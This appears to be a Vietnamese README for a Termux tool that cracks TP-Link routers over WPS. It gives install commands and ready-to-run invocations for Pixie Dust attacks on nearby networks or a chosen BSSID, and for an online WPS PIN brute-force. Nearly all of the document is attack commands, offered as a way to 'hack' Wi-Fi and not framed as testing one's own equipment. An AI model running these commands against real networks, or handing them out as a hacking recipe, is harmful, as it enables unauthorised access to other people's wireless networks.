## BẢN 	TIẾNG VIỆT WPS_Wifi_Cracker_For_TP-Link_Router
### Hack TP Link Wifi Bằng Termux! (Yêu cầu quyền Root)t)

<p align="center"><img src="https://i.ibb.co/K74g0SC/hulu.jpg"></p>

### Cài đặt: :

```bash
$ apt update && apt upgrade -y
$ pkg install -y root-repo
$ pkg install -y git tsu python wpa-supplicant pixiewps iw
$ git clone https://github.com/anhduong295/Vietnamese-WPS_Wifi_Cracker_For_TP-Link_Router-main.git
$ chmod +x WPS_Wifi_Cracker_For_TP-Link_Router/Tanvir_inject.py
To Run: 
$ sudo python Tanvir_inject.py -i wlan0 -K
```

#### Ví dụ: `sudo python Tanvir_inject.py -i wlan0 -K`

#### Lưu ý:: 
**Đầu tiên, hãy tắt Wifi của bạn.**
- Hiển thị các mạng khả dụng và bắt đầu tấn công Pixie Dust vào một mạng cụ thể.
- `sudo python Tanvir_inject.py -i wlan0 -K`
- Bắt đầu tấn công Pixie Dust vào một BSSID cụ thể: 
`sudo python Tanvir_inject.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Khởi chạy tấn công brute-force WPS trực tuyến với nửa đầu của mã PIN được chỉ định:
- `sudo python Tanvir_inject.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
### Khắc phục sự cố
**"Thiết bị hoặc tài nguyên đang bận (-16)" - Bật Wifi sau đó tắt Wifi.**
